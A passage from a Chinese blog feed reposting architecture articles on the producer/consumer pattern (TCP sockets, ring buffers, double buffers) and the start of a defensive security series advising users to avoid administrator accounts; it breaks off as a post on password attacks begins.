id="◇SOCKET（TCP-方式）"><a href="#◇SOCKET（TCP-方式）" class="headerlink" title="◇SOCKET（TCP 方式）"></a>◇SOCKET（TCP 方式）</h3><p>　　基于 TCP 方式的 SOCKET 通讯是又一个类似于队列的 IPC 方式。它同样保证了数据的顺序到达；同样有缓冲的机制。而且这玩意儿也是跨平台和跨语言的，和刚才介绍的 shell 管道符方式类似。<br>　　SOCKET 相比 shell 管道符的方式，有啥优点捏？请看：<br>\1. SOCKET 方式可以跨机器（便于实现分布式）。这是主要优点。<br>\2. SOCKET 方式便于将来扩展成为多对一或者一对多。这也是主要优点。<br>\3. SOCKET 可以设置阻塞和非阻塞方法，用起来比较灵活。这是次要优点。<br>\4. SOCKET 支持双向通讯，有利于消费者反馈信息。</p><p>　　当然有利就有弊。相对于上述 shell 管道的方式，使用 SOCKET 在编程上会更复杂一些。好在前人已经做了大量的工作，搞出很多 SOCKET 通讯库和框架给大伙儿用（比如 C++ 的 <a href="http://www.cs.wustl.edu/~schmidt/ACE.html">ACE</a> 库、Python 的 <a href="http://twistedmatrix.com/">Twisted</a>）。借助于这些第三方的库和框架，SOCKET 方式用起来还是比较爽的。由于具体的网络通讯库该怎么用不是本系列的重点，此处就不细说了。<br>　　虽然 TCP 在很多方面比 UDP 可靠，但鉴于跨机器通讯先天的不可预料性（比如网线可能被某个傻X给拔错了，网络的忙闲波动可能很大），在程序设计上我们还是要多留一手。具体该如何做捏？可以在生产者<strong>进程</strong>和消费者<strong>进程</strong>内部各自再引入基于<strong>线程</strong>的“生产者／消费者模式”。这话听着像绕口令，为了便于理解，画张图给大伙儿瞅一瞅。</p><p><img src="https://lh6.googleusercontent.com/Q6n7axlrP3zHVoLedfVtnr8Bg-v6ySkIFFkgd5nzBJOqBISM9KKMV1koWsH9VoZYDT_WHLlSuhoHf3QP0aYR3HSLzU-wug-gKx1r5Zoe_aybHY33C1P8-NCMtrbL4QcUw_1PXawQ" alt="不见图 请翻墙"></p><p>　　这么做的关键点在于把代码分为两部分：生产线程和消费线程属于和业务逻辑相关的代码（但和通讯逻辑无关）；发送线程和接收线程属于通讯相关的代码（但和业务逻辑无关）。<br>　　这样的好处是很明显的，具体如下：<br>\1. 能够应对<strong>暂时性</strong>的网络故障。并且在网络故障解除后，能够继续工作。<br>\2. 网络故障的应对处理方式（比如断开后的尝试重连），只影响发送和接收线程，不会影响生产线程和消费线程（业务逻辑部分）。<br>\3. 具体的 SOCKET 方式（阻塞和非阻塞）只影响发送和接收线程，不影响生产线程和消费线程（业务逻辑部分）。<br>\4. 不依赖 TCP 自身的发送缓冲区和接收缓冲区。（默认的 TCP 缓冲区的大小可能无法满足实际要求）<br>\5. 业务逻辑的变化（比如业务需求变更）不影响发送线程和接收线程。<br>　　针对上述的最后一条，再多啰嗦几句。如果整个业务系统中有多个进程是采用上述的模式，那或许可以重构一把：在业务逻辑代码和通讯逻辑代码之间切一刀，把业务逻辑无关的部分封装成一个通讯中间件（说“中间件”显得比较牛逼 :-）。如果大伙儿对这玩意儿有兴趣，以后专门开个帖子聊。<br>下一个帖子，咱们来介绍一下环形缓冲区的话题。</p><h1 id="架构设计：生产者-消费者模式-3-：环形缓冲区"><a href="#架构设计：生产者-消费者模式-3-：环形缓冲区" class="headerlink" title="架构设计：生产者/消费者模式[3]：环形缓冲区"></a>架构设计：生产者/消费者模式[3]：环形缓冲区</h1><p><strong>文章目录</strong></p><p>★环形缓冲区 vs 队列缓冲区<br>★环形缓冲区的实现<br>★应用场合</p><p>前文提及了队列缓冲区可能存在的性能问题及解决方法：环形缓冲区。今天就专门来描述一下这个话题。<br>　　为了防止有人给咱扣上“过度设计”的大帽子，事先声明一下：只有当存储空间的分配／释放非常【频繁】并且确实产生了【明显】的影响，你才应该考虑环形缓冲区的使用。否则的话，还是老老实实用最基本、最简单的队列缓冲区吧。还有一点需要说明一下：本文所提及的“存储空间”，不仅包括内存，还可能包括诸如硬盘之类的存储介质。</p><h2 id="★环形缓冲区-vs-队列缓冲区"><a href="#★环形缓冲区-vs-队列缓冲区" class="headerlink" title="★环形缓冲区 vs 队列缓冲区"></a>★环形缓冲区 vs 队列缓冲区</h2><h3 id="◇外部接口相似"><a href="#◇外部接口相似" class="headerlink" title="◇外部接口相似"></a>◇外部接口相似</h3><p>　　在介绍环形缓冲区之前，咱们先来回顾一下普通的队列。普通的队列有一个写入端和一个读出端。队列为空的时候，读出端无法读取数据；当队列满（达到最大尺寸）时，写入端无法写入数据。<br>　　对于使用者来讲，环形缓冲区和队列缓冲区是一样的。它也有一个写入端（用于 push）和一个读出端（用于 pop），也有缓冲区“满”和“空”的状态。所以，从队列缓冲区切换到环形缓冲区，对于使用者来说能比较平滑地过渡。</p><h3 id="◇内部结构迥异"><a href="#◇内部结构迥异" class="headerlink" title="◇内部结构迥异"></a>◇内部结构迥异</h3><p>　　虽然两者的对外接口差不多，但是内部结构和运作机制有很大差别。队列的内部结构此处就不多啰嗦了。重点介绍一下环形缓冲区的内部结构。<br>　　大伙儿可以把环形缓冲区的读出端（以下简称 R）和写入端（以下简称 W）想象成是两个人在体育场跑道上追逐。当 R 追上 W 的时候，就是缓冲区为空；当 W 追上 R 的时候（W 比 R 多跑一圈），就是缓冲区满。<br>　　为了形象起见，去找来一张图并略作修改，如下：</p><p><img src="https://lh6.googleusercontent.com/KowoSKul1tsiKZX-Wv7rJ0BClVdrp8XWLElUklzft62PGTrL9LOwrX7oJhVxy2drCbIx-Wt2qSzyK-vpWbnFC8huDfWgX2h-V2Zaxo-t2njr_fEpWqf4cYI56WkYt7QyOAhuGWqW" alt="不见图 请翻墙"></p><p>　　从上图可以看出，环形缓冲区所有的 push/pop 操作都是在一个【固定】的存储空间内进行。而队列缓冲区在 push 的时候，可能会分配存储空间用于存储新元素；在 pop 时，可能会释放废弃元素的存储空间。所以环形方式相比队列方式，少掉了对于缓冲区元素所用存储空间的分配、释放。这是环形缓冲区的一个主要优势。</p><h2 id="★环形缓冲区的实现"><a href="#★环形缓冲区的实现" class="headerlink" title="★环形缓冲区的实现"></a>★环形缓冲区的实现</h2><p>　　如果你手头已经有现成的环形缓冲区可供使用，并且你对环形缓冲区的内部实现不感兴趣，可以跳过这段。</p><h3 id="◇数组方式-vs-链表方式"><a href="#◇数组方式-vs-链表方式" class="headerlink" title="◇数组方式 vs 链表方式"></a>◇数组方式 vs 链表方式</h3><p>　　环形缓冲区的内部实现，即可基于数组（此处的数组，泛指连续存储空间）实现，也可基于链表实现。<br>　　数组在物理存储上是一维的连续线性结构，可以在初始化时，把存储空间【一次性】分配好，这是数组方式的优点。但是要使用数组来模拟环，你必须在逻辑上把数组的头和尾相连。在顺序遍历数组时，对尾部元素（最后一个元素）要作一下特殊处理。访问尾部元素的下一个元素时，要重新回到头部元素（第0个元素）。如下图所示：</p><p><img src="https://lh6.googleusercontent.com/2NuMql3dVig1XdMDcDQ8T0FBgfSnukU0xsoi9etifAiyFxyKuV_neuaL_bbEb0DswdyR8mTWDkFJHvxZ1Jepl2KcvNFk8y3EPtc_RNDXtEjvHKHb1GWqpqPv2j8UtOg88LR6nZe9" alt="不见图 请翻墙"></p><p>　　使用链表的方式，正好和数组相反：链表省去了头尾相连的特殊处理。但是链表在初始化的时候比较繁琐，而且在有些场合（比如后面提到的跨进程的 IPC）不太方便使用。</p><h3 id="◇读写操作"><a href="#◇读写操作" class="headerlink" title="◇读写操作"></a>◇读写操作</h3><p>　　环形缓冲区要维护两个索引，分别对应写入端（W）和读取端（R）。写入（push）的时候，先确保环没满，然后把数据复制到 W 所对应的元素，最后 W 指向下一个元素；读取（pop）的时候，先确保环没空，然后返回 R 对应的元素，最后 R 指向下一个元素。</p><h3 id="◇判断“空”和“满”"><a href="#◇判断“空”和“满”" class="headerlink" title="◇判断“空”和“满”"></a>◇判断“空”和“满”</h3><p>　　上述的操作并不复杂，不过有一个小小的麻烦：空环和满环的时候，R 和 W 都指向同一个位置！这样就无法判断到底是“空”还是“满”。大体上有两种方法可以解决该问题。<br><strong>办法1：始终保持一个元素不用</strong><br>　　当空环的时候，R 和 W 重叠。当 W 比 R 跑得快，追到距离 R 还有一个元素间隔的时候，就认为环已经满。当环内元素占用的存储空间较大的时候，这种办法显得很土（浪费空间）。<br><strong>办法2：维护额外变量</strong><br>　　如果不喜欢上述办法，还可以采用额外的变量来解决。比如可以用一个整数记录当前环中已经保存的元素个数（该整数&gt;=0）。当 R 和 W 重叠的时候，通过该变量就可以知道是“空”还是“满”。</p><h3 id="◇元素的存储"><a href="#◇元素的存储" class="headerlink" title="◇元素的存储"></a>◇元素的存储</h3><p>　　由于环形缓冲区本身就是要降低存储空间分配的开销，因此缓冲区中元素的类型要选好。尽量存储【值类型】的数据，而不要存储【指针（引用）类型】的数据。因为指针类型的数据又会引起存储空间（比如堆内存）的分配和释放，使得环形缓冲区的效果大打折扣。</p><h2 id="★应用场合"><a href="#★应用场合" class="headerlink" title="★应用场合"></a>★应用场合</h2><p>　　刚才介绍了环形缓冲区内部的实现机制。按照前文的惯例，我们来介绍一下在线程和进程方式下的使用。<br>　　如果你所使用的编程语言和开发库中带有现成的、<strong>成熟的</strong>环形缓冲区，强烈建议使用现成的库，不要重新制造轮子；确实找不到现成的，才考虑自己实现。（如果你纯粹是业余时间练练手，那另当别论）</p><h3 id="◇用于并发线程"><a href="#◇用于并发线程" class="headerlink" title="◇用于并发线程"></a>◇用于并发线程</h3><p>　　和线程中的队列缓冲区类似，线程中的环形缓冲区也要考虑线程安全的问题。除非你使用的环形缓冲区的库已经帮你实现了线程安全，否则你还是得自己动手搞定。线程方式下的环形缓冲区用得比较多，相关的网上资料也多，下面就大致介绍几个。<br>　　对于 C++ 的程序员，强烈推荐使用 <a href="http://www.boost.org/">boost</a> 提供的 <a href="http://www.boost.org/libs/circular_buffer/">circular_buffer</a> 模板，该模板最开始是在 boost 1.35版本中引入的。鉴于 boost 在 C++ 社区中的地位，大伙儿应该可以放心使用该模板。<br>　　对于 C 程序员，可以去看看开源项目 <a href="http://sourceforge.net/projects/circbuf/">circbuf</a>，不过该项目是 GPL 协议的（可能有人会觉得不爽）；而且活跃度不太高；而且只有一个开发人员。大伙儿慎用！建议只拿它当参考。<br>　　对于 C# 程序员，可以参考 <a href="http://www.codeproject.com/KB/recipes/circularbuffer.aspx">CodeProject 上的一个示例</a>。</p><h3 id="◇用于并发进程"><a href="#◇用于并发进程" class="headerlink" title="◇用于并发进程"></a>◇用于并发进程</h3><p>　　进程间的环形缓冲区，似乎少有现成的库可用。大伙儿只好自己动手、丰衣足食了。<br>　　适合进行环形缓冲的 IPC 类型，常见的有“<a href="https://en.wikipedia.org/wiki/Shared_memory#In_software">共享内存</a>和文件”。在这两种方式上进行环形缓冲，通常都采用数组的方式实现。程序事先分配好一个固定长度的存储空间，然后具体的读写操作、判断“空”和“满”、元素存储等细节就可参照前面所说的来进行。<br>　　共享内存方式的性能很好，适用于数据流量很大的场景。但是有些语言（比如 Java）对于共享内存不支持。因此，该方式在多语言协同开发的系统中，会有一定的局限性。<br>　　而文件方式在编程语言方面支持很好，几乎所有编程语言都支持操作文件。但它可能会受限于磁盘读写（Disk I/O）的性能。所以文件方式不太适合于快速数据传输；但是对于某些“数据单元”很大的场合，文件方式是值得考虑的。<br>对于进程间的环形缓冲区，同样要考虑好进程间的同步、互斥等问题，限于篇幅，此处就不细说了。</p><p>　　下一个帖子，咱们来聊一下双缓冲区的使用。</p><h1 id="架构设计：生产者-消费者模式-4-：双缓冲区"><a href="#架构设计：生产者-消费者模式-4-：双缓冲区" class="headerlink" title="架构设计：生产者/消费者模式[4]：双缓冲区"></a>架构设计：生产者/消费者模式[4]：双缓冲区</h1><p><strong>文章目录</strong></p><p>★为啥要双缓冲区？<br>★双缓冲区的原理<br>★双缓冲区的几种状态<br>★可能的并发问题<br>★应用场景</p><p>　　“双缓冲区”是一个应用很广的手法。该手法用得最多的地方想必是屏幕绘制相关的领域（主要是为了减少屏幕闪烁）。另外，在设备驱动和工控方面，双缓冲也经常被使用。不过今天要聊的，并不是针对上述的某个具体领域，而是侧重于并发方面的同步/互斥开销。另外提醒一下，双缓冲方式和前面提到的队列缓冲、环形缓冲是可以结合使用滴。</p><h2 id="★为啥要双缓冲区？"><a href="#★为啥要双缓冲区？" class="headerlink" title="★为啥要双缓冲区？"></a>★为啥要双缓冲区？</h2><p>　　记得前几天在介绍队列缓冲区时，提及了普通队列缓冲区的两个性能问题：“内存分配的开销”和“同步/互斥的开销”（健忘的同学，先回去看看复习一下）。“内存分配的开销”已经在介绍环形缓冲区的时候解决了，而今天要介绍的双缓冲区，就是冲着同步/互斥的开销来的。<br>　　为了防止有人给咱扣上“过度设计”的大帽子，又得来一个事先声明：只有当同步或互斥的开销非常明显的时候，你才应该考虑双缓冲区的使用。否则的话，大伙儿还是老老实实用最基本、最简单的队列缓冲区吧。</p><h2 id="★双缓冲区的原理"><a href="#★双缓冲区的原理" class="headerlink" title="★双缓冲区的原理"></a>★双缓冲区的原理</h2><p>　　前面说了一通废话，现在开始切入正题，说说具体实现。<br>　　所谓“双缓冲区”，故名思义就是要有俩缓冲区（简称 A 和 B）。这俩缓冲区，总是一个用于生产者，另一个用于消费者。当俩缓冲区都操作完，再进行一次切换（先前被生产者写入的转为消费者读出，先前消费者读取的转为生产者写入）。由于生产者和消费者不会<strong>同时</strong>操作<strong>同一个</strong>缓冲区（不发生冲突），所以就不需要在读写<strong>每一个</strong>数据单元的时候都进行同步/互斥操作。（顺便提一下，这又一次展现了【空间换时间】的优化思路）<br>　　但是光有俩缓冲区还不够。为了真正做到“不冲突”，还得再搞两个互斥锁（简称 La 和 Lb），分别对应俩缓冲区。生产者或消费者如果要操作某个缓冲区，必须先拥有对应的互斥锁。补充一句：要达到“不冲突”的效果，其实可以有多种搞法，今天只是挑一个简单的来聊。</p><h2 id="★双缓冲区的几种状态"><a href="#★双缓冲区的几种状态" class="headerlink" title="★双缓冲区的几种状态"></a>★双缓冲区的几种状态</h2><p>　　为了加深某些同学的理解，再描述一下双缓冲区的几种状态。</p><h3 id="◇俩缓冲区都在使用的状态（并发读写）"><a href="#◇俩缓冲区都在使用的状态（并发读写）" class="headerlink" title="◇俩缓冲区都在使用的状态（并发读写）"></a>◇俩缓冲区都在使用的状态（并发读写）</h3><p>　　大多数情况下，生产者和消费者都处于并发读写状态。不妨设生产者写入 A，消费者读取 B。在这种状态下，生产者拥有锁 La；同样的，消费者拥有锁 Lb。由于俩缓冲区都是处于独占状态，因此每次读写缓冲区中的元素（数据单元）都【不需要】再进行加锁、解锁操作。这是节约开销的主要来源。</p><h3 id="◇单个缓冲区空闲的状态"><a href="#◇单个缓冲区空闲的状态" class="headerlink" title="◇单个缓冲区空闲的状态"></a>◇单个缓冲区空闲的状态</h3><p>　　由于两个并发实体的速度会有差异，必然会出现一个缓冲区已经操作完，而另一个尚未操作完。不妨假设生产者快于消费者。<br>　　在这种情况下，当生产者把 A 写满的时候，生产者要先释放 La（表示它已经不再操作 A），然后尝试获取 Lb。由于 B 还没有被读空，Lb 还被消费者持有，所以生产者进入发呆（Suspend）状态。</p><h3 id="◇缓冲区的切换"><a href="#◇缓冲区的切换" class="headerlink" title="◇缓冲区的切换"></a>◇缓冲区的切换</h3><p>　　接着上面的话题。<br>　　过了若干时间，消费者终于把 B 读完。这时候，消费者也要先释放 Lb，然后尝试获取 La。由于 La 刚才已经被生产者释放，所以消费者能立即拥有 La 并开始读取 A 的数据。而由于 Lb 被消费者释放，所以刚才发呆的生产者会缓过神来（Resume）并拥有 Lb，然后生产者继续往 B 写入数据。<br>　　经过上述几个步骤，俩缓冲区完成了对调，变为：生产者写入 B，消费者读取 A。</p><h2 id="★可能的并发问题"><a href="#★可能的并发问题" class="headerlink" title="★可能的并发问题"></a>★可能的并发问题</h2><p>　　本来单个缓冲区的生产者/消费者问题就已经是教科书的经典问题了，现在搞出俩缓冲区，所以就更加耗费脑细胞了。一不小心，就会搞出些并发的Bug，而且并发的Bug还很难调试和测试（这也就是为啥不要轻易使用该玩意儿的原因）。</p><h3 id="◇死锁的问题"><a href="#◇死锁的问题" class="headerlink" title="◇死锁的问题"></a>◇死锁的问题</h3><p>　　假如把前面介绍的操作步骤调换一下顺序：生产者或消费者在操作完当前的缓冲区之后，先去获取另一个缓冲区的锁，再来释放当前缓冲区的锁。那会咋样捏？<br>　　一旦两个并发实体【同时】处理完各自缓冲区，然后【同时】去获取对方拥有的锁，那就会出现典型的死锁（死锁的详细解释参见“<a href="https://en.wikipedia.org/wiki/Deadlock">这里</a>”）场景。它俩从此陷入万劫不复的境地。</p><h2 id="★应用场景"><a href="#★应用场景" class="headerlink" title="★应用场景"></a>★应用场景</h2><p>　　介绍完并发问题，按照本系列的惯例，最后再来介绍一下双缓冲区在某些场合的应用。</p><h3 id="◇用于并发线程-1"><a href="#◇用于并发线程-1" class="headerlink" title="◇用于并发线程"></a>◇用于并发线程</h3><p>　　在线程方式下，首先要考虑的是缓冲区的类型：到底用队列方式还是环形方式。这方面的选择依据在<a href="https://program-think.blogspot.com/2009/04/producer-consumer-pattern-3-circle.html">介绍环形缓冲区</a>的时候已经阐述过了，此处不再啰嗦（省去不少口水）。<br>　　另一个需要注意的是，某些编程语言或者程序库提供了的线程安全的缓冲区（比如 JDK 1.5 引入的 <a href="http://java.sun.com/j2se/1.5.0/docs/api/java/util/concurrent/ArrayBlockingQueue.html">ArrayBlockingQueue</a>）。由于这种缓冲区会自动为每次的读写进行同步/互斥，所以就把双缓冲的优势抵消掉了。因此，大伙儿在进行缓冲区选型的时候要避开这类缓冲区。</p><h3 id="◇用于并发进程-1"><a href="#◇用于并发进程-1" class="headerlink" title="◇用于并发进程"></a>◇用于并发进程</h3><p>　　在进程间使用双缓冲，先得考察不同 IPC 类型的特点。由于今天讨论双缓冲的目的是降低同步/互斥的开销，对于那些已经封装了同步/互斥的 IPC 类型，就没太大必要再去搞双缓冲了（单凭这条就足以让好多种 IPC 出局）。剩下的 IPC 类型中，比较适合用双缓冲的主要是：共享内存和文件。非常凑巧，这两个玩意儿的特点和适用范围在环形缓冲区的帖子里面也已经介绍过了，俺又可以节省不少口水 :)</p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> programthink </tag>
            
            <tag> 小妙招 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何防范黑客入侵？</title>
      <link href="/2021/07/17/%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%EF%BC%9F/"/>
      <url>/2021/07/17/%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="如何防止黑客入侵-1-：避免使用高权限用户"><a href="#如何防止黑客入侵-1-：避免使用高权限用户" class="headerlink" title="如何防止黑客入侵[1]：避免使用高权限用户"></a>如何防止黑客入侵[1]：避免使用高权限用户</h1><p><strong>文章目录</strong></p><p>★基本概念扫盲<br>★反面教材<br>★危害性<br>★你该如何做？<br>★可能的麻烦</p><p>　　为啥俺把这个话题列在头一条？——因为这是个非常普遍、且远远没有得到重视的问题。根据俺的经验，如果你能够养成好习惯，【不】使用高权限用户（尤其是管理员）进行日常操作，就可以大大降低被黑的概率。下面，俺就来具体介绍一下。</p><h2 id="★基本概念扫盲"><a href="#★基本概念扫盲" class="headerlink" title="★基本概念扫盲"></a>★基本概念扫盲</h2><p>　　考虑到本文是面向外行人士，先进行一下名词解释。</p><h3 id="◇用户权限"><a href="#◇用户权限" class="headerlink" title="◇用户权限"></a>◇用户权限</h3><p>　　所谓的“用户权限”，通俗地说，就是某个用户的权力有多大。权力越大，能干的事情越多。</p><h3 id="◇用户组"><a href="#◇用户组" class="headerlink" title="◇用户组"></a>◇用户组</h3><p>　　用户组，顾名思义，就是一组用户的集合。<br>　　在主流的操作系统中，“用户权限”通常是和“用户组”挂钩滴。针对不同的用户组，分配了不同的权限。<br>　　为了让用户省事儿，Windows 系统内置了若干用户组（比如：Users、Power Users、Guests、等）。这些内置的用户组，事先已经预定义好若干用户权限。</p><h3 id="◇高权限用户"><a href="#◇高权限用户" class="headerlink" title="◇高权限用户"></a>◇高权限用户</h3><p>　　本文提及的【高权限用户】，主要是指 Windows 系统中 Administrators 组的用户或 Linux/Unix 系统中 root 组的用户。<br>　　另外，顺便消除一个误解。很多菜鸟以为：Windows 系统中，只有用户名为“Administrator”的用户才具有管理员权限。其实捏，任何一个用户，即使用户名不叫“Administrator”，只要是属于“Administrators 组”，也同样具有管理员权限。</p><h2 id="★反面教材"><a href="#★反面教材" class="headerlink" title="★反面教材"></a>★反面教材</h2><p>　　菜鸟的例子就不提了，光说说俺接触过的很多程序员吧。这帮家伙在使用 Linux/Unix 系统进行开发时，都晓得应该用普通用户的帐号进行操作；当需要做某些高级权限的操作，再切换到管理员帐号（root 帐号）。但即便是这些开发人员，在自己的 Windows 系统中，却喜欢用管理员（Administrator）进行日常操作，实在是很讽刺。<br>　　如果连 IT 专业的开发人员都这样，那不太懂技术的菜鸟，就可想而知了。</p><h2 id="★危害性"><a href="#★危害性" class="headerlink" title="★危害性"></a>★危害性</h2><p>　　如果你平时总是用管理员权限登录到系统并进行日常工作，那就意味着你所运行的每一个程序，同时也具有了管理员权限。要知道，管理员权限的权力是非常大滴——几乎可以干任何事情。<br>　　假设你有上述【坏】习惯。某天，你从网上下载了一个软件，且软件已经感染了病毒。那么，当你运行这个软件时，这个病毒就会被激活。更要命的是，它也同样具有【管理员权限】。也就是说，病毒获得了与杀毒软件平起平坐的地位。假如这个病毒的作者水平再高一些，甚至可以骗过杀毒软件或者直接把杀毒软件干掉。<br>　　除了病毒，木马也是一样。假设你上网的时候，一不留神访问了某个挂马的网站。一旦木马被激活，也同样是以【管理员权限】运行，危害同样也巨大。</p><h2 id="★你该如何做？"><a href="#★你该如何做？" class="headerlink" title="★你该如何做？"></a>★你该如何做？</h2><p>　　考虑到 Windows 系统的用户占绝大多数，俺就光拿 Windows 系统来说事儿。希望 Linux 及 Mac OS 的 fans 不要见怪哦。<br>　　为了尽量少用高权限用户。你最好刚装好系统之后，单独创建一个非管理员用户。</p><p><img src="https://lh6.googleusercontent.com/WH5jStjSfrIiS7K23a7P7djloFJwbpO68Mba5QM30svmTqiUY5e2PKGp8tCwXKJ3FAm9mMia1FqR8vbhj8KO_wCZEy4M2a2RuoGwXt5FkbdRuuNUqgWmCeas3Z31" alt="不见图、请翻墙"></p><p>　　你可以让该用户仅仅属于“Power Users 组”，如下图：</p><p><img src="https://lh4.googleusercontent.com/HTwKLKC6pIatq9iWzj0RLDHxTbv5LqR2CtMAptU6INKFBgW6iWLhZgDayWjvHLqXmSrWFcYq9MzORqogF1EFVnjwzR_ql9OYuD15fWAc2iiMRn1OL_MQSMH09pqc" alt="不见图、请翻墙"></p><p>　　如果想更安全的话，可以只加入“Users 组”，今后，就主要通过这个用户进行日常的操作。如下图：</p><p><img src="https://lh6.googleusercontent.com/BRpPpLliuAgsOOUYdc7kfZs37JRnq2zhT6JcsExN1yXhc9-mEPCR_WNnvkYAIesHDmFyiA_QkfjL6y5znzkvf5JsXH_akCNpljtufIbPeeUpAOreI7AFiJs_QycZ" alt="不见图、请翻墙"></p><p>　　考虑到有些同学不了解这两个用户组，在权限方面与管理员有啥区别。俺简单列举一下。</p><h3 id="◇“Power-Users组”与“Administrators-组”的差别"><a href="#◇“Power-Users组”与“Administrators-组”的差别" class="headerlink" title="◇“Power Users组”与“Administrators 组”的差别"></a>◇“Power Users组”与“Administrators 组”的差别</h3><p>　　相对于“Administrators 组”，“Power Users 组”缺少了如下几项权限（俺只列主要的）：<br>\1. 不能添加、删除、禁用系统中的其它用户。<br>\2. 不能修改其它用户的属性（包括口令、所属的用户组、等）<br>\3. 不能安装/卸载硬件驱动程序。<br>\4. 不能安装/卸载某些应用软件。<br>\5. 不能查看系统的安全日志。</p><h3 id="◇“Users-组”与“Administrators-组”的差别"><a href="#◇“Users-组”与“Administrators-组”的差别" class="headerlink" title="◇“Users 组”与“Administrators 组”的差别"></a>◇“Users 组”与“Administrators 组”的差别</h3><p>　　“Users 组”的权限比“Power Users 组”更小。除了“Power Users 组”做不到的事情，“Users 组”还【缺少】如下权限（俺只列主要的）：<br>\1. 不能修改系统时间。<br>\2. 不能修改某些系统目录（包括：系统盘的 <code>\WINDOWS</code> 目录、系统盘的 <code>\WINDOWS\SYSTEM32</code> 目录、系统盘的 <code>\Program Files</code> 目录）。<br>\3. 不能启动/停止某些系统服务。<br>\4. 不能修改注册表 <code>HKEY_LOCAL_MECHINE</code> 下的所有键值。</p><p>　　从上述对照，明显可知，“Users 组”的权限更小，使用起来更安全。比如说，即使你运行了一个带毒的程序，由于病毒和你一样，也仅有“Users 组”的权限。所以病毒也就无法修改/破坏重要的系统目录，掀不起太大风浪。</p><h2 id="★可能的麻烦"><a href="#★可能的麻烦" class="headerlink" title="★可能的麻烦"></a>★可能的麻烦</h2><p>　　通常来说，越安全的措施，往往也意味着越麻烦。但是这些麻烦，都有相应的解决之道。</p><h3 id="◇切换用户的麻烦"><a href="#◇切换用户的麻烦" class="headerlink" title="◇切换用户的麻烦"></a>◇切换用户的麻烦</h3><p>　　当你以普通用户身份登录后，可能由于某些原因，需要用管理员用户干点事情。但是你（可能是开了很多程序）又不想把当前用户注销。<br>　　俺的建议是：使用【快速用户切换】（洋文叫：Fast User Switching）功能来切换用户。此功能从 Windows XP 开始提供。简单地说，就是可以让几个不同的用户同时登录同一个系统，平滑地切换。有了此功能，这个麻烦就不明显啦。</p><p>　　如果你非常不幸，还在使用比较古老的 Windows 2000 系统；或者你使用的是 Windows 的服务版本（比如 Windows Server 2003）。在这些版本的 Windows 系统中，默认是没有“快速用户切换”功能滴。这可咋办捏？<br>　　俺的建议是：<br>　　可以在【不】注销当前用户的情况下，以另一个用户（比如管理员）启动某个需要更高权限的程序。为了说清楚，举例如下：<br>　　假设你当前处于一个普通用户的环境，但是想另外启动一个具有管理员权限的程序，比如说命令行程序（cmd.exe）。<br>\1. 你先创建一个指向 <code>cmd.exe</code> 的快捷方式。（该咋样创建快捷方式，就不用俺来教了吧？）<br>\2. 用鼠标选中该快捷方式，在快捷菜单（右键菜单）中，选择“属性”菜单项。出现如下对话框。</p><p><img src="https://lh3.googleusercontent.com/wDy02yigImXIySuFYQHMtWPnKw6FNI3iEsUFbqiw-2y-gRFLesDX_kzUw3YXKm93XcPY933FVIqb1VXywe2jcA7fKmxEXDyW3k44flkdE1Vcsvx6OoUOyiVHSjUG" alt="不见图、请翻墙"></p><p>\3. 在该对话框中，点“高级”按钮。出现如下对话框。把“以其他用户身份运行”选项打勾，即可。至此，快捷方式创建完毕。</p><p><img src="https://lh3.googleusercontent.com/X47byUOJ2PtD7Smq9ArZdUFPjBjrCgrkY9lYSdWnTB7RIHUq1ByRDxtDL9v09Nk5eACHC4RzZDcV0RT9-adVQ77RxwGOqACe0YPpC_UgOEsSX4bp85kbWWlKwFJn" alt="不见图、请翻墙"></p><p>\4. 以后，如果你想在普通用户环境中，以管理员身份执行命令行，只需点击该快捷方式，就会弹出如下对话框。然后在该对话框中输入管理员的用户名和口令，就能以管理员的身份，把该命令行启动起来。</p><p><img src="https://lh5.googleusercontent.com/vULI8x0WJ0XStJdYnN3G-t4Dj_Pr0YTzB-vyOVnANH04M2I6UXVOs49EJDwBS0Ba6Rq9pc0-JcekxJvrIrWh7mr2CzTGnVMr6LFAsQFlLf7w479G9PLEQWSW3-Ia" alt="不见图、请翻墙"></p><h3 id="◇安装软件-驱动的麻烦"><a href="#◇安装软件-驱动的麻烦" class="headerlink" title="◇安装软件/驱动的麻烦"></a>◇安装软件/驱动的麻烦</h3><p>　　安装驱动总是需要【管理员权限】才行；另外，很多软件（比如 MS Office）在安装时，也要求用【管理员权限】进行。<br>　　俺的建议是：<br>　　在刚装好系统之后，先用管理员用户把上述这些软件/驱动程序都搞好。然后，就无需再用管理员用户了。毕竟你经常使用的软件相对固定，不可能三天两头安装软件或驱动（除非你是软/硬件发烧友）。即便偶尔需要重新装个软件或驱动，也可以用上述介绍的方式，【临时】切换到管理员权限。</p><h3 id="◇修改系统时间的麻烦"><a href="#◇修改系统时间的麻烦" class="headerlink" title="◇修改系统时间的麻烦"></a>◇修改系统时间的麻烦</h3><p>　　如果你平时用的是“Users 组”而不是“Power Users 组”，那你连修改系统时间的权限也没有。<br>　　俺的建议是：<br>　　启用 Windows 系统自带的时间同步服务，让它帮你自动同步系统时间。</p><p>　　除了上述这几点，如果还有谁碰到其它的麻烦，也欢迎来信跟俺交流。俺会补充到本文中。本系列的下一个帖子，将会介绍攻击者是如何搞定你的口令/密码</p><h1 id="如何防止黑客入侵-2-：攻击者如何搞定你的口令-密码？"><a href="#如何防止黑客入侵-2-：攻击者如何搞定你的口令-密码？" class="headerlink" title="如何防止黑客入侵[2]：攻击者如何搞定你的口令/密码？"></a>如何防止黑客入侵[2]：攻击者如何搞定你的口令/密码？</h1><p><strong>文章目录</strong></p><p>★使用密码的场合（密码的类型）<br>★攻击者如何通过技术手段搞定的你的密码？<br>★攻击者如何通过【非技术】手段搞定的你的密码？<br>★结尾</p><p>　　在上文，俺强调了高权限用户的潜在风险。接下来，咱要介绍一下，和口令相关的安全话题。毕竟在大伙儿的日常生活中，口令的使用是必不可少滴。<br>　　考虑到和口令相关的内容较多，俺分两部分来说：今天首先揭露攻击者的种种伎俩；下一帖再详述应对的措施。</p><h2 id="★使用密码的场合（密码的类型）"><a href="#★使用密码的场合（密码的类型）" class="headerlink" 